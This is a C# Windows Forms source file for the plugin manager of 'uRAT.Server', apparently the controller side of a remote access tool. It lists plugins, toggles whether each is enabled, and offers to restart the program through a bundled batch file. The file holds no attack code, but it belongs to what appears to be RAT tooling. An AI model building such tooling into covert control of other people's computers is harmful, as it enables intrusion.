using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace uRAT.Server.Forms
{
    public partial class PluginManagerForm : Form
    {
        private string _origData;

        public PluginManagerForm()
        {
            InitializeComponent();
        }

        private void PluginManager_Load(object sender, EventArgs e)
        {
            PopulatePluginList();
            _origData = GetCheckedItemsString();
        }

        private void PopulatePluginList()
        {
            // will overflow if we don't do this
            listView1.ItemChecked -= listView1_ItemChecked;
            listView1.Items.Clear();
            foreach (var pluginMetadata in Globals.SettingsHelper.FetchAllPlugins())
            {
                var lvItm = new ListViewItem(pluginMetadata.Name);
                lvItm.SubItems.Add(pluginMetadata.Author);
                lvItm.SubItems.Add(pluginMetadata.Version.ToString());
                lvItm.SubItems.Add(pluginMetadata.Description);
                lvItm.Checked = pluginMetadata.Enabled;
                lvItm.Tag = pluginMetadata.Guid;
                listView1.Items.Add(lvItm);
            }
            listView1.ItemChecked += this.listView1_ItemChecked;
        }

        private void listView1_ItemChecked(object sender, ItemCheckedEventArgs e)
        {
            Globals.SettingsHelper.TogglePluginStatus((Guid) e.Item.Tag, e.Item.Checked);
            PopulatePluginList();
        }

        private void PluginManagerForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            foreach (ListViewItem lvItm in listView1.Items)
            {
                Globals.PluginAggregator.LoadedPlugins.First(p => p.PluginHostGuid == (Guid) lvItm.Tag).Enabled =
                    lvItm.Checked;
            }
            if (_origData != GetCheckedItemsString())
            {
                var result =
                    MessageBox.Show(
                        "In order for the changes to take effect uRAT needs to be restarted. Do you wish to restart now?",
                        "Apply changes", MessageBoxButtons.YesNoCancel);
                switch (result)
                {
                    case DialogResult.Yes:
                        File.WriteAllText("restart.bat", Properties.Resources.RestartBatchScript);
                        Process.Start("restart.bat");
                        Application.Exit();
                        break;
                    case DialogResult.Cancel:
                        e.Cancel = true;
                        break;
                }
            }
        }

        string GetCheckedItemsString()
        {
            var str = new StringBuilder();
            foreach (ListViewItem itm in listView1.Items)
                str.Append(itm.Checked ? "1" : "0");
            return str.ToString();
        }
    }
}

